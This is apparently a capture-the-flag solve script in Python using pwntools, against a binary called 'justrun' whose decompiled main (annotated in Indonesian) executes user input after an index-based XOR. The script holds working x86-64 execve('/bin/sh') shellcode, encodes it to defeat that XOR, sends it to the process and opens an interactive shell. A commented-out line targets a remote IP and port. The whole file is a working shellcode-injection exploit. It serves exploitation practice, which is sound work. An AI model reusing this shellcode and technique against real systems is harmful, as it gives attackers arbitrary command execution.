from pwn import *


'''
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *v3; // rdi
  char input_user[4104]; // [rsp+10h] [rbp-1030h]
  void (__fastcall *v6)(void *, char *); // [rsp+1018h] [rbp-28h]
  char *v7; // [rsp+1020h] [rbp-20h]
  int length_input_user; // [rsp+102Ch] [rbp-14h]
  void *dest; // [rsp+1030h] [rbp-10h]
  int i; // [rsp+103Ch] [rbp-4h]

  dest = mmap(0LL, 4096uLL, 7, 34, 0, 0LL);
  printf("Send your code to run: ", 4096LL, argv);
  fflush(_bss_start);
  fflush(stdin);
  memset(input_user, 144, 0x1001uLL);           // setting memory s
  fgets(input_user, 4097, stdin);               // minta input standar
  length_input_user = strlen(input_user);       // ambil length input
  for ( i = 0; i < length_input_user; ++i )
    input_user[i] ^= i;                         // di xor dengan inputan user
  signal(4, illegal);                           // trigger error pada signal
  signal(11, (__sighandler_t)wrong);            // trigger error pada signal
  v7 = input_user;                              // nilai yang sama pada input user
  *(_DWORD *)input_user |= 1u;
  v6 = (void (__fastcall *)(void *, char *))dest;
  if ( length_input_user > 1 )
    input_user[length_input_user - 1] = -61;
  v3 = dest;
  memcpy(dest, input_user, length_input_user);
  v6(v3, input_user);
  puts("The code executed cleanly did you get the flag?");
  return 0;
}
'''
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
def encode(src):
	enc = ''
	for i in range(len(src)):
		enc += chr(ord(src[i]) ^ i)
	return enc 


#r = remote("180.250.135.11",2200)
r = process("./justrun")
p = encode(shellcode)
r.sendline(p)
r.interactive()

